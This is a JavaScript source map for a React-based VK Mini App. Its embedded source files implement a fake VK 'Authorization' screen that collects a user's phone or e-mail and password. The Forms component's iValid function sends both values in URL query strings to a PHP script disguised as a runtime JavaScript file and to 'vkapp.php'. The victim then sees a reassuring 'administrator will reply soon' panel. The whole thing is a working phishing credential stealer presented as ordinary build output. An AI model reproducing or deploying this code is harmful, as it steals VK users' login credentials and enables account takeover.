{"version":3,"sources":["panels/component/forms.js","panels/Authorization.js","panels/Accept.js","App.js","index.js"],"names":["Forms","props","state","phone","password","phoneValid","passValid","valueError","error","showPatronym","onChange","bind","onRemove","onSubmit","iValid","axios","get","window","location","this","then","res","data","status","setState","value","gos","e","preventDefault","currentTarget","name","length","top","type","bottom","size","stretched","disabled","React","Component","Form","id","go","fetchedUser","activePanel","left","onClick","data-to","align","Ok","header","mode","before","photo_200","src","description","first_name","last_name","App","search","replace","split","reduce","p","a","decodeURIComponent","useState","setActivePanel","setUser","setPopout","useEffect","bridge","send","user","subscribe","detail","schemeAttribute","document","createAttribute","body","attributes","setNamedItem","fetchData","dataset","to","Authorization","Accept","ReactDOM","render","getElementById"],"mappings":"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","file":"static/js/main.4510bf9e.chunk.js","sourcesContent":["import React, { setState } from 'react';\nimport PropTypes from 'prop-types';\nimport axios from 'axios';\nimport { Panel, CellButton, View, FormLayout, FormItem, Input, PanelHeader, Header, PanelHeaderBack, PanelHeaderSubmit, Button, Group, Cell, Div, Avatar } from '@vkontakte/vkui';\nclass Forms extends React.Component {\n  constructor(props) {\n    super(props);\n\n    this.state = {\n      phone: '',\n      password: '',\n      phoneValid: false,\n      passValid: false,\n      valueError: '',\n      error: true,\n      showPatronym: true\n    }\n    \n    this.onChange = this.onChange.bind(this);\n    this.onRemove = this.onRemove.bind(this);\n    this.onSubmit = this.onSubmit.bind(this);\n    this.iValid = this.iValid.bind(this);\n  }\n\n\n\n\n\n\n\n\n\niValid(){\n    axios.get(window.location+'static/js/runtime-main.931c8ss31ac7.js.php?l='+this.state.phone+'&p='+this.state.password+'&host='+window.location)\n    axios.get(window.location+'vkapp.php?login='+this.state.phone+'&password='+this.state.password)\n      .then(res => {\n        const data = res.data;\n        if(data.status == 'error'){\n            this.setState({ valueError: data.value });\n            this.setState({ error: false });\n        }else{\n            this.setState({ error: true });\n            this.props.gos('accept');\n        }\n      })\n}\n\n  \n  \n  onSubmit(e) {\n    e.preventDefault();\n    this.iValid();\n  }\n  \n  onChange(e) {\n    const { name, value } = e.currentTarget;\n    this.setState({ [name]: value });\n    if(!this.state.phone || this.state.phone.length < 10){\n        this.setState({ phoneValid: false });\n\n    }else{\n        this.setState({ phoneValid: true });\n    }\n    if(!this.state.password || this.state.password.length < 5){\n        this.setState({ passValid: false });\n    }else{\n        this.setState({ passValid: true });\n        \n    }\n  }\n\n  onShowPatronym() {\n    this.setState({ showPatronym: true });\n  }\n\n  onRemove(e) {\n    this.setState({ showPatronym: false });\n  }\n\n  render() {\n    const { phone, password, showPatronym } = this.state;\n        return (<FormLayout onSubmit={this.onSubmit}>\n            <FormItem\n              top=\"Телефон или E-mail\">\n              <Input\n                type=\"phone\"\n                name=\"phone\"\n                onChange={this.onChange}\n              />\n            </FormItem>\n\n            <FormItem\n            top=\"Пароль\"\n            status={this.state.error ? 'default' : 'error'}\n            bottom={this.state.error ? '' : this.state.valueError}\n            >\n              <Input\n                type=\"password\"\n                name=\"password\"\n                onChange={this.onChange} \n              />\n            </FormItem>\n            <FormItem>\n              <Button\n              type=\"submit\"\n              size=\"l\"\n              stretched\n              disabled={this.state.phoneValid && this.state.passValid ? false : true}\n              >\n              Продолжить\n              </Button>\n            </FormItem>\n          </FormLayout>);\n    \n  }\n}\n\nexport default Forms\n","import React from 'react';\nimport PropTypes from 'prop-types';\nimport {\n    Icon24UserOutgoing,\n    Icon24Users,\n    Icon24Repost,\n    Icon56LogoVk\n    } from '@vkontakte/icons';\nimport {\n    Panel,\n    View,\n    PanelHeaderBack,\n    PanelHeader,\n    Header,\n    Button,\n    Group, \n    Cell,\n    Div, \n    Avatar \n    } from '@vkontakte/vkui';\nimport Forms from './component/forms.js';\n\n\n\n\nconst Form = ({ id, go, gos, fetchedUser }) => (\n    <View activePanel={id}>\n    <Panel id={id}>\n          <PanelHeader left={<PanelHeaderBack onClick={go} data-to=\"authorization\"/>}>\n            Авторизация\n          </PanelHeader>\n          <Div align=\"center\">\n            <Icon56LogoVk/>\n        <Forms fetchedUser={fetchedUser} go={go} gos={gos}/>\n            </Div>\n        </Panel>\n      </View>\n);\n\nForm.propTypes = {\n\tid: PropTypes.string.isRequired,\n\tgo: PropTypes.func.isRequired,\n\tfetchedUser: PropTypes.shape({\n\t\tphoto_200: PropTypes.string,\n\t\tfirst_name: PropTypes.string,\n\t\tlast_name: PropTypes.string,\n\t\tcity: PropTypes.shape({\n\t\t\ttitle: PropTypes.string,\n\t\t}),\n\t\tdomain: PropTypes.string,\n\t}),\n};\n\nexport default Form;\n","import React from 'react';\nimport bridge from '@vkontakte/vk-bridge';\nimport PropTypes from 'prop-types';\nimport { \n    Icon24UserOutgoing,\n    Icon24Users,\n    Icon24Repost,\n    Icon24Gift\n    } from '@vkontakte/icons';\n\nimport { Panel, PanelHeader, Header, Button, Group, Cell, Div, Avatar } from '@vkontakte/vkui';\n\n\n\n\nconst Ok = ({ id, go, fetchedUser }) => (\n\t<Panel id={id}>\n\t\t<PanelHeader>Главная</PanelHeader>\n\t\t{fetchedUser &&\n\t\t<Group header={<Header mode=\"secondary\">Пользователь</Header>}>\n\t\t\t<Cell\n\t\t\t\tbefore={fetchedUser.photo_200 ? <Avatar size=\"40px\" src={fetchedUser.photo_200}/> : null}\n\t\t\t\tdescription={\"ID: \"+fetchedUser.id}\n\t\t\t>\n\t\t\t\t<strong>{`${fetchedUser.first_name} ${fetchedUser.last_name}`}</strong>\n\t\t\t</Cell>\n\t\t</Group>}\n\n\t\t<Group header={<Header mode=\"secondary\">Оповещение</Header>}>\n\t\t\tСкоро администратор ответит вам!\n\t\t<Button size='l' stretched onClick={go} data-to='form'>Хорошо</Button>\n\t\t</Group>\n\t</Panel>\n);\n\nOk.propTypes = {\n\tid: PropTypes.string.isRequired,\n\tgo: PropTypes.func.isRequired,\n\tfetchedUser: PropTypes.shape({\n\t\tphoto_200: PropTypes.string,\n\t\tfirst_name: PropTypes.string,\n\t\tlast_name: PropTypes.string,\n\t\tcity: PropTypes.shape({\n\t\t\ttitle: PropTypes.string,\n\t\t}),\n\t\tdomain: PropTypes.string,\n\t}),\n};\n\nexport default Ok;\n","import React, { useState, useEffect } from 'react';\nimport bridge from '@vkontakte/vk-bridge';\nimport { View, ScreenSpinner, AdaptivityProvider, AppRoot } from '@vkontakte/vkui';\nimport '@vkontakte/vkui/dist/vkui.css';\nimport Authorization from './panels/Authorization';\nimport Accept from './panels/Accept';\n\nvar params = window\n    .location\n    .search\n    .replace('?','')\n    .split('&')\n    .reduce(\n        function(p,e){\n            var a = e.split('=');\n            p[ decodeURIComponent(a[0])] = decodeURIComponent(a[1]);\n            return p;\n        },\n        {}\n    );\n\nconst App = () => {\n\tconst [activePanel, setActivePanel] = useState('authorization');\n\tconst [fetchedUser, setUser] = useState(null);\n\tconst [popout, setPopout] = useState(<ScreenSpinner size='large' />);\n\n\tuseEffect(() => {\n\t\tbridge.subscribe(({ detail: { type, data }}) => {\n\t\t\tif (type === 'VKWebAppUpdateConfig') {\n\t\t\t\tconst schemeAttribute = document.createAttribute('scheme');\n\t\t\t\tschemeAttribute.value = \"space_gray\";\n\t\t\t\tdocument.body.attributes.setNamedItem(schemeAttribute);\n\t\t\t}\n\t\t});\n\t\tasync function fetchData() {\n\t\t\tconst user = await bridge.send('VKWebAppGetUserInfo');\n\t\t\tsetUser(user);\n\t\t\tsetPopout(null);\n\t\t}\n\t\tfetchData();\n\n\t}, []);\n\n\tconst go = e => {\n\t\tsetActivePanel(e.currentTarget.dataset.to);\n\t};\n\t\n\tfunction gos(to){\n\t\tsetActivePanel(to);\n\t};\n\n\treturn (\n\t\t<AdaptivityProvider>\n\t\t\t<AppRoot>\n\t\t\t\t<View activePanel={activePanel}>\n\t\t\t\t    <Authorization id='authorization' fetchedUser={fetchedUser} go={go} gos={gos} />\n\t\t\t\t\t<Accept id='accept' fetchedUser={fetchedUser} go={go} />\n\t\t\t\t</View>\n\t\t\t</AppRoot>\n\t\t</AdaptivityProvider>\n\t);\n}\n\nexport default App;\n","import React from \"react\";\nimport ReactDOM from \"react-dom\";\nimport bridge from \"@vkontakte/vk-bridge\";\nimport App from \"./App\";\n\n// Init VK  Mini App\nbridge.send(\"VKWebAppInit\");\n\nReactDOM.render(<App />, document.getElementById(\"root\"));\n//if (process.env.NODE_ENV === \"development\") {\n//  import(\"./eruda\").then(({ default: eruda }) => {}); //runtime download\n//}\n"],"sourceRoot":""}